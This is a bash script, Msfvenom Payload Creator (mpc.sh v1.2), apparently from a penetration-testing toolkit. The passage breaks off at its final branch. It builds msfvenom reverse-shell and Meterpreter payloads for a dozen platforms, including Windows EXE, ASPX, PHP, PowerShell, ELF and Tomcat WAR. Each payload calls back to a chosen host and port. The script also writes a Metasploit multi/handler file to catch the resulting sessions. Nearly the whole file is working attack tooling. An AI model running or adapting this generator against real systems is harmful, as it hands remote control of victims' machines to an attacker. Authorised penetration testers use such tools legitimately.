#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: mpc.sh (v1.2)               (Update: 2015-07-01) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Linux & Metasploit v4.11+   #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Requires:                                                  #
#    Metasploit Framework v4.11.3-2015062101 or higher        #
#    Will not auto update when there are more payloads added  #
#                             ---                             #
#  Commands:                                                  #
#    msfvenom --list payloads                                 #
#    msfvenom --help-formats                                  #
#                             ---                             #
#  Payload names:                                             #
#    shell_bind_tcp - Single / Inline / NonStaged / Stageless #
#    shell/bind_tcp - Staged (Requires Metasploit)            #
#-More information--------------------------------------------#
#   - https://www.offensive-security.com/metasploit-unleashed/payloads/
#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/
#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom
#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
#--Install----------------------------------------------------#
#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
#  chmod +x /usr/bin/mpc
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#


##### Variables
OUTPATH="$(pwd)/"      # ./  /var/www/   /tmp/

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
RESET="\033[00m"       # Normal

##### Read command line arguments
TYPE=""                #"$(echo ${1} | \tr '[:upper:]' '[:lower:]')"
IP=""                  #"${2}"
PORT=""                #"${3}"
STAGE=""               # staged // stageless
SHELL=""               # shell // meterpreters
VERBOSE=false

##### Default values
SUCCESS=false
DOMAIN=false
BATCH=false
LOOP=false

##### (Optional) Enable debug mode?
#set -x


#-Function-------------------------------------------------------------#

## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL STAGE VERBOSE
function doAction {
  TYPE="${1}"
  IP="${2}"
  PORT="${3}"
  PAYLOAD="${4}"
  CMD="${5}"
  FILEEXT="${6}"
  SHELL="${7}"
  STAGE="${8}"
  VERBOSE="${9}"

  if [[ -z "${VERBOSE}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}:   doAction TYPE(${TYPE}) IP(${IP}) PORT(${PORT}) PAYLOAD(${PAYLOAD}) CMD(${CMD}) FILEEXT(${FILEEXT}) SHELL(${SHELL}) STAGE(${STAGE}) VERBOSE(${VERBOSE})" >&2
    exit 2
  fi

  if [[ "${STAGE}" == 'true' ]]; then _STAGE='-staged'
  else _STAGE=''; fi

  FILENAME="${OUTPATH}$(echo ${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT} | \tr '[:upper:]' '[:lower:]')"
  FILEHANDLE="${OUTPATH}$(echo ${TYPE}-${STAGE}-${SHELL}-${PORT}-${FILEEXT}.rc | \tr '[:upper:]' '[:lower:]')"

  X="  IP"
  [[ "${DOMAIN}" == "true" ]] &&  X='NAME'

  echo -e " ${YELLOW}[i]${RESET}  ${X}: ${YELLOW}${IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}  PORT: ${YELLOW}${PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}  TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} STAGE: ${YELLOW}${STAGE}${RESET}"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} SHELL: ${YELLOW}${SHELL}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   CMD: ${YELLOW}${CMD}${RESET}"

  [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. Overwriting..." && rm -f "${FILENAME}"
  eval "${CMD}" 2>/dev/null
  if [[ -e "${FILENAME}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
  else
    echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET}. =(" >&2
    exit 2
  fi

  #echo -e " ${YELLOW}[i]${RESET}  File: $(\file -b ${FILENAME})"
  #echo -e " ${YELLOW}[i]${RESET}  Size: $(\du -h ${FILENAME} | \cut -f1)"
  #echo -e " ${YELLOW}[i]${RESET}   MD5: $(\openssl md5 ${FILENAME} | \awk '{print $2}')"
  #echo -e " ${YELLOW}[i]${RESET}  SHA1: $(\openssl sha1 ${FILENAME} | \awk '{print $2}')"

  cat <<EOF > "${FILEHANDLE}"
#
# RUN:   service postgresql start; service metasploit start; msfconsole -q -r "${FILENAME}"
#
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${IP}
set LPORT ${PORT}
#set AutoRunScript "migrate -f -k"   post/windows/manage/smart_migrate
set ExitOnSession false
run -j
EOF
  echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${YELLOW}${FILEHANDLE}${RESET}'   (msfconsole -q -r ${FILEHANDLE})"
  SUCCESS=true
  return
}


#-Start----------------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.2${RESET})"


## Check system
## msfvenom installed?
if [[ ! -n "$(\which msfvenom)" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
  exit 3
fi

## Are we using Linux? (Sorry OSX users)
if [[ "$(\uname)" != "Linux" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Linux${RESET}" >&2
  exit 3
fi

## Is there a writeable path for us?
if [[ ! -d "${OUTPATH}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Unable to use ${OUTPATH}${RESET}" >&2
  exit 3
fi


## Get default values
IFACE=( $(\awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__') )
IPs=( $(\ifconfig | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1) )        # OSX -> \ifconfig | \grep inet | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}'
TYPEs=( asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Must always be a higher count than ${FORMATs}
FORMATs=(          sh    jsp   lin elf  macho  pl         ps1        py      war     win exe )


## Check user input
## Able to detect NIC interfaces?
if [[ "${IFACE}" == "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find any network interfaces${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## Able to detect IP addresses?
if [[ "${IPs}" == "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## (!!!Magic Alert!!!) Try to predict what's what with inputs...
for x in $(\tr '[:upper:]' '[:lower:]' <<< "$@" ); do
    if [[ "${x}" =~ ^--* ]]; then true                                                                                                                               # Long argument? (skip!)
  elif [[ "${x}" == "verbose" || "${x}" == "v" ]]; then VERBOSE=true                                                                                                 # Verbose?
  elif [[ "${x}" == "all" || "${x}" == "batch" || "${x}" == "a" ]]; then BATCH=true                                                                                  # Batch mode?
  elif [[ "${x}" == "loop" || "${x}" == "l" ]]; then LOOP=true                                                                                                       # Loop mode?
  elif [[ "${x}" == "staged" || "${x}" == "stage" || "${x}" == "small" ]]; then STAGE=true                                                                           # Staged?
  elif [[ "${x}" == "stage"*"less" || "${x}" == "single" || "${x}" == "inline" || "${x}" == "no"* || "${x}" == "full" ]]; then STAGE=false                           # Stageless?
  elif [[ "${x}" == "cmd" || "${x}" == "shell" || "${x}" == "normal" ]]; then SHELL="shell"                                                                          # Shell?
  elif [[ "${x}" == "meterpreter" || "${x}" == "msf" || "${x}" == "meterp" ]]; then SHELL="meterpreter"                                                              # Meterpreter?
  elif [[ "${x}" =~ ^-?[0-9]+$ && "${x}" -gt 1 && "${x}" -lt 65535 ]]; then PORT="${x}"                                                                              # Port?
  elif [[ "${x}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then IP="${x}"                                                                   # IP?
  elif [[ "${x}" == *.* ]]; then IP="${x}"                                                                                                                           # Domain/DNS? (weak detection & doesn't support hostname)
  else
    known=false
    for (( i=0; i<${#IFACE[@]}; ++i )); do [[ "${x}" == "${IFACE[${i}]}" ]] && IP="${IPs[${i}]}" && known=true && break; done                                        # Interface? (rather than a an IP)
    for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ "${x}" == "${TYPEs[${i}]}" ]] && TYPE="${TYPEs[${i}]}" && known=true && break; done                                    # Type?
    for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ "${x}" == "${FORMATs[${i}]}" ]] && TYPE="${FORMATs[${i}]}" && known=true && break; done                              # Type? (aka formats)
    [[ "${known}" == false ]] && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" && exit 1                                                # ...if we got this far, we failed. =(
  fi
done

## If the user defined a value, overwrite it regardless
while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
  opt="${1}";
  shift;
  case "$(echo ${opt} | tr '[:upper:]' '[:lower:]')" in
    -|-- ) break 2;;

    -t|--type )
       TYPE="${1}"; shift;;
    --type=* )
       TYPE="${opt#*=}";;

    -i|--ip )
       IP="${1}"; shift;;
    --ip=* )
       IP="${opt#*=}";;

    -p|--port )
       PORT="${1}"; shift;;
    --port=* )
       PORT="${opt#*=}";;

    -s|--staged )
       STAGE=true;;
    --stageless )
       STAGE=false;;
    --stage )
       STAGE="${1}"; shift;;
    --stage=* )
       STAGE="${opt#*=}";;

    -m|--msf|--meterpreter )
       SHELL="meterpreter";;
    -c|--cmd|--shell )
       SHELL="shell";;
    --shell )
       SHELL="${1}"; shift;;
    --shell=* )
       SHELL="${opt#*=}";;

    -a|--all|--batch )
       BATCH=true;;
    -l|--loop )
       LOOP=true;;

    --verbose )
       VERBOSE=true;;

    *) echo -e " ${YELLOW}[i]${RESET} Invalid option: ${RED}${x}${RESET}" && exit 1;;
   esac
done

## Set default values
[[ -z "${PORT}" ]] && PORT="443"
  if [[ "${STAGE}" == "true" || "${STAGE}" == "staged" || "${STAGE}" == "stage" || "${STAGE}" == "small" ]]; then STAGE='staged'; _STAGE='/'
elif [[ "${STAGE}" == "false" || "${STAGE}" == "stage"*"less" || "${STAGE}" == "single" || "${STAGE}" == "inline" || "${STAGE}" == "no"* || "${STAGE}" == "full" ]]; then STAGE='stageless'; _STAGE='_'; fi
#else STAGE="_"; fi    # <--- cant due to batch mode
  if [[ "${SHELL}" == "shell" || "${SHELL}" == "cmd" || "${SHELL}" == "normal" ]]; then SHELL="shell"
elif [[ "${SHELL}" == "meterpreter" || "${SHELL}" == "msf" || "${SHELL}" == "meterp" ]]; then SHELL="meterpreter"; fi
#else SHELL="meterpreter"; fi   # <--- cant due to batch mode

## Did user enter an interface instead of an IP address?
for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=${IPs[${x}]} && break; done

## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do
    (( ${BASH_REMATCH[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
  done
elif [[ "${IP}" != "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
  DOMAIN=true
fi

## Valid port?
if [[ "${PORT}" -lt 1 || "${PORT}" -gt 65535 ]]; then
  echo -e " ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}" >&2
  exit 3
fi

## IP menu
if [[ -n "${TYPE}" && -z "${IP}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET}/${YELLOW}IP address${RESET}?:"
  I=0
  for iface in "${IFACE[@]}"; do
    IPs[${I}]="$(\ifconfig ${iface} | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 | sort)"
    [[ "${IPs[${I}]}" == "" ]] && IPs[${I}]="UNKNOWN"

    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"

    I=$[${I}+1]
  done
  _IP=""
  while [[ "${_IP}" == "" ]]; do
    echo -ne " ${YELLOW}[?]${RESET} ${GREEN}Select${RESET} 1-${I}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
    for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP="${IPs[${x}]}"; done   # Did user enter interface?
    [[ "${INPUT}" != *"."* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] && _IP="${IPs[${INPUT}-1]}"        # Did user select number?
    #for ip in "${IPs[@]}"; do [[ "${INPUT}" == "${ip}" ]] && _IP="${ip}"; done                               # Did user enter a known IP?
    [[ "${INPUT}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP="${INPUT}"         # Did the user enter a IP address (doesn't valid it)
    IP="${_IP}"
  done
  echo ""
fi


## Generate #1 (Looping)
## Loop mode?
if [[ "${LOOP}" == "true" ]]; then
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
    echo ""
    eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
    echo ""
  done   # for TYPEs[@]
  TYPE=""
## Batch mode?
elif [[ "${BATCH}" == "true" ]]; then
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
  if [[ -z "${TYPE}" || "${TYPEs[${i}]}" == "${TYPE}" || "${FORMATs[${i}]}" == "${TYPE}" ]]; then
    type="${TYPEs[${i}]}"
    [[ -n "${TYPE}" && "${FORMATs[${i}]}" == "${TYPE}" ]] && type="${FORMATs[${i}]}"
    for staged in staged stageless; do
    if [[ -z "${STAGE}" || "${staged}" == "${STAGE}" ]]; then
      for shell in meterpreter shell; do
      if [[ -z "${SHELL}" || "${shell}" == "${SHELL}" ]]; then
        [[ "${VERBOSE}" == "true" ]] && _VERBOSE="verbose"
        echo ""
        eval "${0}" "${type}" "${IP}" "${PORT}" "${shell}" "${staged}" "${_VERBOSE}"
        echo ""
      fi        # "${shell}" == "${SHELL}"
      done      # for shell
    fi        # "${staged}" == "${STAGE}"
    done      # for staged
    echo -e "\n"
  fi        # "${TYPEs[${i}]}" == "${TYPE}"
  done      # for TYPEs[@]
  TYPE=""
fi


## Valid shell?
if [[ -n "${TYPE}" && "${SHELL}" != "shell" && "${SHELL}" != "meterpreter" && "${SHELL}" != "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} SHELL (${SHELL}) is incorrect. Needs to be either ${YELLOW}shell${RESET} or ${YELLOW}meterpreter${RESET}" >&2
  exit 3
fi

## Valid staged?
if [[ -n "${TYPE}" && "${STAGE}" != "staged" && "${STAGE}" != "stageless" && "${STAGE}" != "" ]]; then
  echo -e " ${YELLOW}[i]${RESET} STAGED (${STAGE}) is incorrect. Needs to be either ${YELLOW}staged${RESET} or ${YELLOW}stageless${RESET}" >&2
  exit 3
elif [[ -n "${TYPE}" && "${_STAGE}" != "/" && "${_STAGE}" != "_" && "${STAGE}" != "" ]]; then    # "${STAGE}" != "" is correct
  echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally) with stage: ${_STAGE}.${RESET}"
  exit 2
fi


## Generate #2 (Main)
## ASP
if [[ "${TYPE}" == "asp" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # stageless meterpreter - The EXE generator now has a max size of 2048 bytes, please fix the calling module
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGELESS METERPRETER ASP. Goes over Metasploit's ${RED}file size limit${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="windows"
  FILEEXT="asp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## ASPX
elif [[ "${TYPE}" == "aspx" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="stageless" && _STAGE="_"
  TYPE="windows"
  FILEEXT="aspx"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Bash
elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="shell"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGLESSS BASH. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do METERPRETER BASH. There ${RED}isn't a BASH Meterpreter${RESET}...yet." >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="bash"
  FILEEXT="sh"
  PAYLOAD="cmd/unix${_STAGE}reverse_bash"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform unix -e generic/none -a cmd LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Java
elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGELESS METERPRETER JAVA. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="java"
  FILEEXT="jsp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Linux
elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless"  && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGELESS METERPRETER LINUX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="linux"
  FILEEXT="elf"    #bin
  PAYLOAD="${TYPE}/x86/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## OSX
elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="shell"
  [[ "${STAGE}" == "" ]] && STAGE="stageless" && _STAGE="_"
  # meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "/" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGLED OSX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do METERPRETER OSX. There ${RED}isn't a OSX Meterpreter${RESET}...yet." >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="osx"
  FILEEXT="macho"
  PAYLOAD="osx/x86/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Perl
elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="shell"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGLESSS PERL. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do METERPRETER PERL. There ${RED}isn't a PERL Meterpreter${RESET}...yet." >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="linux"
  FILEEXT="pl"
  PAYLOAD="cmd/unix${_STAGE}reverse_perl"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform unix -a cmd -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## PHP
elif [[ "${TYPE}" == "php" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="stageless" && _STAGE="_"
  # shell - Invalid Payload Selected
  if [[ "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do SHELL PHP. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="php"
  FILEEXT="php"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Powershell
elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="stageless" && _STAGE="_"
  TYPE="windows"
  FILEEXT="ps1"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ps1 --platform ${TYPE} -e generic/none -a x86 LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Python
elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # staged shell // stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "staged" && "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGED SHELL Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  elif [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGEless METERPRETER Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="python"
  FILEEXT="py"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Tomcat
elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="staged" && _STAGE="/"
  # stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do STAGELESS METERPRETER TOMCAT. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
    [[ "${VERBOSE}" != 'true' ]] && exit 5
  fi
  TYPE="tomcat"
  FILEEXT="war"
  PAYLOAD="java/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform java -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

## Windows
elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" ]]; then
  [[ "${SHELL}" == "" ]] && SHELL="meterpreter"
  [[ "${STAGE}" == "" ]] && STAGE="stageless" && _STAGE="_"
  TYPE="windows"
  FILEEXT="exe"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}reverse_tcp"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} -o ${OUTPATH}${TYPE}-${STAGE}-${SHELL}-${PORT}.${FILEEXT}"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${STAGE}" "${VERBOSE}"

elif [[ -z "${TYPE}" ]]; then
  #echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"
  true
else
